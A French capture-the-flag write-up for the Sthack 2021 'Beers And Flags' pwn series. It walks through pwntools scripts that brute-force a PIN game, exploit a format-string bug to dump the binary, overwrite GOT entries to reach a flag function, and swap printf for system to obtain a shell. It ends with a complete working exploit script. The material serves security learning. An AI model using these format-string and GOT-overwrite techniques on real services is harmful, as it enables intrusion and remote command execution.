---
title: Série - Beers And Flags
category: Sthack2021
authors: 
  - karzemrok
  - vaelio
tags:
- sthack2021
- programmation
- pwn
- ctf
description: "Writeup Sthack 2021 - Beers And Flags - Série"
---

## Partie 1 - Gagner 42 fois

En accédant au challenge, on voit que pour avoir le flag il faudra trouver un bon code pin à 4 chiffres 42 fois. Si le PIN est bon, on recevra "**4B0F**".


```sh
$ nc localhost 1234

Beers & Flags
Enjoy the GAME :) 

How to play ? :
	 - you win if you find 4 beers (4B0F)
	 - all digits in the number must be unique
	 - number cannot start with 0 but can contain it
	 - if you enter more than 4 digits the rest will be ignored
	 - if you win 42 times, I'll give you a gift :) 
	 - to exit press 'ctrl + c'

guess the 4 digit number:
1234
	0B3F (try #1)
```

Le plus simple est de faire une itération de 1000 à 9999 (le PIN ne peut pas commencer par 0) et de vérifier à chaque fois si le pin correspond aux règles énoncées. Une fois les 42 PIN trouvés on regardera ce qu'il se passe.

```python
from pwn import *

def is_good_number(number):
    return len(set([n for n in str(number)])) == 4

r = remote('localhost', 1234, level='error')
r.recvuntil(b'guess the 4 digit number:\n')

win = 0
progress = log.progress('Try to win ')
while win < 42:
    for n in range(1000, 10000):
        if is_good_number(n):
            progress.status(str(win)+"/"+str(n))
            r.send(str(n)+"\n".encode())
            res = p.recvuntil(b'\n')
            if b'4B0F' in res:
                win +=1
                if win == 42: 
                    r.interactive()
                else:
                    r.recvuntil(b'guess the 4 digit number:\n')
                break
```

```sh
[+] Opening connection to localhost on port 1234: Done
[+] Try to win : 41/7531
[*] Switching to interactive mode

you win 42 times with 3328 tries, keep going on :) 
Well played !!
 Here is your flag : 
STHACK{....}
```

## Partie 2 - Dump le Binaire

Pour la partie 2, le nombre de victoires nécessaires est à 1. De plus, on nous indique un problème avec `printf`. Il va falloir ici récupérer le binaire en passant par une "format string".

La première étape d'une "format string" est de trouver l'offset à partir duquel, nous pourrons ensuite manipuler une adresse à lire ou écrire.

Pour cela, on va utiliser la notation suivante : 

`JUNKDATA|%{}$p|`

On incrémentera à chaque tour de boucle.

Il nous faut également une fonction permettant d'exploiter la "format string" avec le payload spécifique.

```python
from pwn import *

def is_good_number(number):
    return len(set([n for n in str(number)])) == 4

def send_payload(payload):
    r = remote('localhost', 1234, level='error')
    r.recvuntil(b'guess the 4 digit number:\n')
    for n in range(1000, 10000):
        if is_good_number(n):
            r.send(str(n).encode()+b"\n")
            res = r.recvuntil(b'\n')
            if b'4B0F' in res:
                try:
                    r.recvuntil(b'Enter your nickname for scoreboard :')
                    r.sendline(payload)
                    r.recvuntil(b'#3 - \n')
                    leak = r.recvuntil(b'\n')
                    r.close()
                    return leak
                except:
                    return ""

progress = log.progress('Looking for format string offset')

JUNK = ""
OFFSET = 0

for i in range(50):
    progress.status(str(i))
    g = cyclic_gen()
    res = send_payload(g.get(8)+"|%{}$p|".format(str(i)).encode()).split(b'|')[1]
    if res.startswith(b'0x'):
        if g.find(int(res, 16))[0] > -1:
            OFFSET = i
            JUNK = b"A"*g.find(int(res, 16))[0]
            break

progress.success(str(OFFSET))
```

Avec un script comme celui-ci, nous trouvons un offset de 17.

Maintenant que nous avons notre offset, nous pouvons essayer de lire à l'adresse `0x8048000` qui est une adresse de base classique pour un programme 32bit (on sait que c'est du 32bit grâce à notre recherche d'offset qui à fait fuiter quelques adresses de la mémoire)

L'adresse de base contenant l'opcode \x00, nous ne pourrons pas le faire fuiter puisque notre payload sera tronqué. Nous allons donc lire l'adresse suivante.


```python
def memleak(offset, junk, addr):
    try:
        res = send_payload(junk+pack(addr)+"|%{}$s|".format(offset).encode())
        return b''.join(res.split(b'|')[1:-1])+b"\x00"
    except:
        return b"\x00"

print(memleak(OFFSET, JUNK, 0x8048001))
```

On a bien une valeur commençant par `ELF`, on est donc prêt à récuperer le binaire.

Pour ne pas dumper le binaire plus précisément, nous allons récupérer quelques infos de l'entête ELF:

- e_shoff: décalage en octets de la table des entêtes de sections
- e_shentsize: taille en octets d'un entête de section
- e_shnum: nombre d'entrées de la table des entêtes de sections

Avec ces différentes valeurs, il est possible de calculer la taille totale du binaire.

```python
e_shoff = memleak(OFFSET, JUNK, 0x8048000+0x20)
e_shoff = e_shoff[1]*256+e_shoff[0]
log.info("e_shoff: {}".format(e_shoff))
e_shentsize = memleak(OFFSET, JUNK, 0x8048000+0x2e)[0]
log.info("e_shentsize: {}".format(e_shentsize))
e_shnum = memleak(OFFSET, JUNK, 0x8048000+0x30)[0]
log.info("e_shnum: {}".format(e_shnum))
filesize = e_shoff+e_shentsize*e_shnum
log.info("filesize: {}".format(filesize))

p = log.progress('Leaking the binary')
offset = 0
while not offset>filesize:
    ADDR = 0x8048000+offset
    p.status("({}/{}) {}".format(offset, filesize, hex(ADDR)))
    res = memleak(OFFSET, JUNK, ADDR)
    if len(res) == 0:
        res = b"\x00"
    with open('bin', 'ab') as binary:
        binary.write(res)
    offset += len(res)
p.success('OK')
```

Une fois le binaire récupéré (les adresses qui ne contiennent pas l'opcode \x00), on peut trouver le flag dans le binaire.

## Partie 3 - Execution d'une fonction interne

Le binaire est disponible pour cette partie : [beersandflags_2](https://github.com/ZenSecCTF/zensecctf.github.io/releases/download/Sthack2021-Files/beersandflags_2)

Pour accéder au flag numéro 3, il va falloir forcer le binaire à passer dans une fonction. La fonction "**flag2**" va exécuter la commande `cat /home/ctf/flag2.txt`

La manière la plus simple de réussir à aller dans cette fonction est de réécrire l'adresse de exit avec l'adresse de flag2, ou celle d'un call vers cette fonction.

![](/static/sthack2021/beers-and-flags/upload_974bf74eeffa4153e9b9bd2728e7a917.png)


On peut voir que l'adresse de exit commence par `0x0804` ce qui va nous permettre de pouvoir réecrire seulement deux octets de l'adresse


![](/static/sthack2021/beers-and-flags/upload_2a1325e94c87bae3b4e5266d8c8d0d6e.png)

Le payload pour la "format string" va être le suivant :

`JUNK EXIT@GOT %PADDINGx%OFFSET$hn`

L'opération $hn va écrire le nombre d'octets de l'input, à l'adresse pointé par l'offset. Pour augmenter artificiellement la taille de l'input, on utilise la notation `%PADDINGx%` ou PADDING vaut la valeur à définir à laquelle on soustrait le `JUNK` et la taille de l'adresse.

On va aussi en profiter pour ajouter un mode interactif à notre fonction send_payload pour pouvoir lire le flag et ça sera utile pour la suite : 

```python
def send_payload(payload, interactive=False):
    r = remote('localhost', 1234, level='error')
    r.recvuntil(b'guess the 4 digit number:\n')
    for n in range(1000, 10000):
        if is_good_number(n):
            r.send(str(n).encode()+b"\n")
            res = r.recvuntil(b'\n')
            if b'4B0F' in res:
                try:
                    r.recvuntil(b'Enter your nickname for scoreboard :')
                    r.sendline(payload)
                    r.recvuntil(b'#3 - \n')
                    if interactive:
                        r.interactive()
                    leak = r.recvuntil(b'\n')
                    r.close()
                    return leak
                except:
                    return ""
```

On peut maintenant écrire une fonction de write_what_where et écrire l'adresse du call à la fonction "**flag2**" à l'adresse de "**exit**"

```python
def write_what_where(what, where, offset, junk=b""):
   return junk+pack(where)+"%{}x%{}$hn".format(what-len(junk)-4 ,offset).encode()

send_payload(write_what_where(0x99a6, 0x804c02c, OFFSET, JUNK), True)
```

![](/static/sthack2021/beers-and-flags/upload_659ac74cb3e64eeaa54c1243a32d78bf.png)

## Partie 3 - Obtention d'un shell

Le binaire est disponible pour cette partie : [beersandflags_4](https://github.com/ZenSecCTF/zensecctf.github.io/releases/download/Sthack2021-Files/beersandflags_4)

Pour obtenir un shell, il va falloir envoyer plusieurs payloads. Pour ce faire, il va falloir faire en sorte que le binaire passe plusieurs fois par la fonction printf vulnérable. On peut par exemple replacer l'adresse de la fonction "**exit**" par l'adresse de la fonction "**main**". De cette manière, au lieu de quitter, le programme va redémarrer, mais en gardant l'état de nos modifications.

Contrairement aux autres parties, nous allons devoir réutiliser la même instance du binaire, il va falloir modifier la fonction "**send_payload**"

```python
def send_payload(r, payload, interactive=False):
    r.recvuntil(b'guess the 4 digit number:\n')
    ...
```

Notre début de script peut donc être:

```python
def get_remote():
    return remote('localhost', 1234, level='error')
    
r = get_remote()
send_payload(r, write_what_where(0x99d1, 0x804c02c, OFFSET, JUNK))
```

Pour exécuter une commande, on peut remplacer "**printf@libc**"" par "**system@libc**". De cette manière, quand nous accèderons au scoreboard, nous pourrons mettre la commande de notre choix et cette commande sera exécutée. Par contre, tous les appels à printf vont aussi déclencher un appel à system ce qui va créer pas mal d'erreur dans notre output.

Il faut d'abord récupérer l'adresse de "**system@libc". Dans la GOT, c'est l'adresse `0x804c028`

```python
system_libc = unpack(memleak(r, OFFSET, JUNK, 0x804c028)[:4])
log.info("system@libc: "+hex(system_libc))
```

Nous allons modifier notre fonction *write_what_where* pour supporter des écritures d'adresses plus longues.

```python
def write_what_where(what, where, offset, junk=b""):
    if what < 65535:
        return junk+pack(where)+"%{}x%{}$hn".format(what-len(junk)-4 ,offset).encode()
    else:
        first = what % 0x10000
        second = int(what / 0x10000)
        payload = junk+pack(where)+pack(where+2)
        len_payload = len(payload)
        payload += "%{}x%{}$hn".format(first-len_payload, str(offset))
        second_len = second-first if first < second else 0x10000-first+second
        payload += "%{}x%{}$hn".format(second_len, str(offset+1))
        return payload
```

Grâce à cette fonction, nous allons écrire l'adresse en deux temps. Cette fonction ne fonctionne que si les deux premiers octets du pointer ont une valeur supérieure aux deux derniers.

```python
send_payload(r, write_what_where(system_libc, 0x804c010, OFFSET, JUNK))
log.success("printf@libc -> system@libc")
```

Maintenant que printf est devenu system, notre fonction send_payload n'est plus fonctionnelle. On va donc en écrire une spécialement pour cette étape.

```python
def send_payload_system(r):
    progress = log.progress('Try to win and get a shell')
    for n in range(1000, 10000):
        if is_good_number(n):
            progress.status(str(n))
            r.send(str(n).encode()+b"\n")
            res = r.recvuntil(b'Enter your nickname for scoreboard :', timeout=0.01)
            if b'Enter your nickname' in res:
                progress.success('Win !')
                r.interactive()
                return
```

On a plus qu'à l'appeler et à attendre notre shell 

```python
send_payload_system(r)
```

![](/static/sthack2021/beers-and-flags/upload_dd35ccd2c9a2dac48969d2fc53da5a56.png)

Voici le script final avec chaque step dans une fonction particulière 

```python
from pwn import *

def is_good_number(number):
    return len(set([n for n in str(number)])) == 4

def get_remote():
    return remote('localhost', 1234, level='error')

def send_payload(r, payload, interactive=False):
    if r is None:
        r = get_remote()
        close = True
    else:
        close = False
    r.recvuntil(b'guess the 4 digit number:\n')
    for n in range(1000, 10000):
        if is_good_number(n):
            r.send(str(n).encode()+b"\n")
            res = r.recvuntil(b'\n')
            if b'4B0F' in res:
                try:
                    r.recvuntil(b'Enter your nickname for scoreboard :')
                    r.sendline(payload)
                    r.recvuntil(b'#3 - \n')
                    if interactive:
                        r.interactive()
                    leak = r.recvuntil(b'\n')
                    if close:
                        r.close()
                    return leak
                except:
                    return ""

def send_payload_system(r):
    progress = log.progress('Try to win and get a shell')
    for n in range(1000, 10000):
        if is_good_number(n):
            progress.status(str(n))
            r.send(str(n).encode()+b"\n")
            res = r.recvuntil(b'Enter your nickname for scoreboard :', timeout=0.01)
            if b'Enter your nickname' in res:
                progress.success('Win !')
                r.interactive()
                return

progress = log.progress('Looking for format string offset')

JUNK = ""
OFFSET = 0

for i in range(50):
    progress.status(str(i))
    g = cyclic_gen()
    res = send_payload(get_remote(), g.get(8)+"|%{}$p|".format(str(i)).encode()).split(b'|')[1]
    if res.startswith(b'0x'):
        if g.find(int(res, 16))[0] > -1:
            OFFSET = i
            JUNK = b"A"*g.find(int(res, 16))[0]
            break
        

progress.success(str(OFFSET))

def memleak(r, offset, junk, addr):
    try:
        res = send_payload(r, junk+pack(addr)+"|%{}$s|".format(offset).encode())
        return b''.join(res.split(b'|')[1:-1])+b"\x00"
    except:
        return b"\x00"

def write_what_where(what, where, offset, junk=b""):
    if what < 65535:
        return junk+pack(where)+"%{}x%{}$hn".format(what-len(junk)-4 ,offset).encode()
    else:
        first = what % 0x10000
        second = int(what / 0x10000)
        payload = junk+pack(where)+pack(where+2)
        len_payload = len(payload)
        payload += "%{}x%{}$hn".format(first-len_payload, str(offset)).encode()
        second_len = second-first if first < second else 0x10000-first+second
        payload += "%{}x%{}$hn".format(second_len, str(offset+1)).encode()
        return payload

def solve_level_2(OFFSET, JUNK):
    e_shoff = memleak(None, OFFSET, JUNK, 0x8048000+0x20)
    e_shoff = e_shoff[1]*256+e_shoff[0]
    log.info("e_shoff: {}".format(e_shoff))
    e_shentsize = memleak(None, OFFSET, JUNK, 0x8048000+0x2e)[0]
    log.info("e_shentsize: {}".format(e_shentsize))
    e_shnum = memleak(None, OFFSET, JUNK, 0x8048000+0x30)[0]
    log.info("e_shnum: {}".format(e_shnum))
    filesize = e_shoff+e_shentsize*e_shnum
    log.info("filesize: {}".format(filesize))

    p = log.progress('Leaking the binary')
    offset = 0
    while not offset>filesize:
        ADDR = 0x8048000+offset
        p.status("({}/{}) {}".format(offset, filesize, hex(ADDR)))
        res = memleak(None, OFFSET, JUNK, ADDR)
        with open('bin', 'ab') as binary:
            binary.write(res)
        offset += len(res)
    p.success('OK')

def solve_level_3(OFFSET, JUNK):
    payload = write_what_where(0x99a6, 0x804c02c, OFFSET, JUNK)
    send_payload(None, payload, True)

def solve_level_4(OFFSET, JUNK):
    r = get_remote()
    send_payload(r, write_what_where(0x99d1, 0x804c02c, OFFSET, JUNK))
    system_libc = unpack(memleak(r, OFFSET, JUNK, 0x804c028)[:4])
    log.info("system@libc: "+hex(system_libc))
    send_payload(r, write_what_where(system_libc, 0x804c010, OFFSET, JUNK))
    log.success("printf@libc -> system@libc")
    send_payload_system(r)
    return
    
#solve_level_2(OFFSET, JUNK)
#solve_level_3(OFFSET, JUNK)
solve_level_4(OFFSET, JUNK)
```

Cette exploitation aurait pu être simplifiée en utilisant un peu plus pwnlib. Cependant, savoir le faire à la main avant d'utiliser ce genre d'outils est intéressant pour bien comprendre ce qu'il se passe.